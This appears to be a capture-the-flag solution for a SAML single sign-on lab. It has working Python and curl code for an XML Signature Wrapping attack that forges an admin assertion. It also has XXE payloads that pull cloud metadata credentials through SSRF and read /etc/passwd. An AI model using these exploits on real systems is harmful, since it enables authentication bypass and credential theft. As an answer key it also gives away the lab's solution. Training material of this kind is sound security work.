# Solution: SAML SSO Chain (web-saml-sso)

## Vulnerability Chain (two paths to the flag)

### Path A: XSW → Admin Access → Flag
1. Log in as normal user (alice/alice123) to get a valid signed SAML assertion
2. Apply XML Signature Wrapping: inject a fake admin assertion before the signed one
3. SP verifies signature on the second assertion but grants access based on the FIRST
4. Access `/admin/vault` as admin to get the flag

### Path B: XXE → SSRF → Metadata Service → Flag
1. Log in as any user (XSW optional — XXE works for any authenticated user)
2. POST to `/import` with an XXE payload that makes SSRF to the metadata service
3. The metadata service returns fake AWS credentials where SecretAccessKey = FLAG

## Path A: XML Signature Wrapping

### Step 1: Get a valid SAML assertion

```bash
# Navigate to: http://<TARGET_IP>:8080/saml/login
# Login as alice / alice123
# Intercept the POST to http://sp:8081/saml/acs
# Capture the SAMLResponse value (base64)
```

With curl (automated):
```bash
TARGET="http://<TARGET_IP>:8080"
# Get the IDP login page, then POST credentials
SAML_RESP=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST "$TARGET/saml/login" \
  -d "username=alice&password=alice123&relay_state=/dashboard" \
  | grep -oP 'SAMLResponse" value="\K[^"]+')
```

### Step 2: Decode and modify the SAML assertion

```python
import base64
from lxml import etree

# Decode original SAMLResponse
saml_b64 = "..."  # captured from step 1
xml_bytes = base64.b64decode(saml_b64)
doc = etree.fromstring(xml_bytes)

SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol"

# Find the original (signed) assertion
original_assertion = doc.find(f"{{{SAML_NS}}}Assertion")
original_id = original_assertion.get("ID")

# Create a fake admin assertion (unsigned) with a different ID
import uuid, datetime
fake_id = "_" + uuid.uuid4().hex
now = datetime.datetime.utcnow()
fmt = "%Y-%m-%dT%H:%M:%SZ"

fake_assertion_xml = f"""<saml:Assertion
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="{fake_id}"
    Version="2.0"
    IssueInstant="{now.strftime(fmt)}">
  <saml:Issuer>http://idp.corp.local/saml</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@corp.local</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData
          NotOnOrAfter="2099-01-01T00:00:00Z"
          Recipient="http://sp:8081/saml/acs"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:Conditions NotBefore="{now.strftime(fmt)}" NotOnOrAfter="2099-01-01T00:00:00Z">
    <saml:AudienceRestriction>
      <saml:Audience>http://sp.corp.local/saml</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement AuthnInstant="{now.strftime(fmt)}">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
  <saml:AttributeStatement>
    <saml:Attribute Name="username">
      <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="role">
      <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="email">
      <saml:AttributeValue>admin@corp.local</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>"""

fake_assertion = etree.fromstring(fake_assertion_xml.encode())

# Insert fake assertion BEFORE the signed one in the Response
# The SP's verifier uses the FIRST assertion for auth (XSW vulnerability)
doc.remove(original_assertion)
doc.insert(list(doc).index(doc.find(f"{{{SAMLP_NS}}}Status")) + 1, fake_assertion)
doc.append(original_assertion)

# Re-encode
modified_saml = base64.b64encode(etree.tostring(doc, xml_declaration=True, encoding="UTF-8")).decode()
print(modified_saml)
```

### Step 3: Submit the modified SAML response

```python
import requests

SP_URL = "http://<SP_IP>:8081"  # or via IDP proxy

session = requests.Session()
resp = session.post(
    f"{SP_URL}/saml/acs",
    data={"SAMLResponse": modified_saml, "RelayState": "/admin/vault"},
    allow_redirects=True
)
# Should redirect to /admin/vault with admin session
print(resp.text)  # Contains the flag
```

## Path B: XXE → SSRF (Simpler)

### Login as any user first, then exploit the document importer

```python
import requests

TARGET = "http://<TARGET_IP>:8080"
SP_URL = "http://<SP_IP>:8081"

# Login via IDP (alice/alice123)
session = requests.Session()
# ... (login flow as above, get session cookie on SP)

# XXE payload — reads from internal metadata service
xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "http://metadata-service/latest/meta-data/iam/security-credentials/ctf-role">
]>
<document>
  <title>Test</title>
  <content>&xxe;</content>
</document>"""

resp = session.post(
    f"{SP_URL}/import",
    data={"xmlcontent": xxe_payload}
)
# The response will contain the JSON from the metadata service
# which includes: "SecretAccessKey": "HL4{...FLAG...}"
print(resp.text)
```

#### Alternative: file read via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<document><content>&xxe;</content></document>
```

## Flag Locations
- Path A flag: returned by `GET /admin/vault` on the SP when logged in as admin
- Path B flag: in the SecretAccessKey field of the metadata service response
- Both flags are the same value (set via FLAG env var)
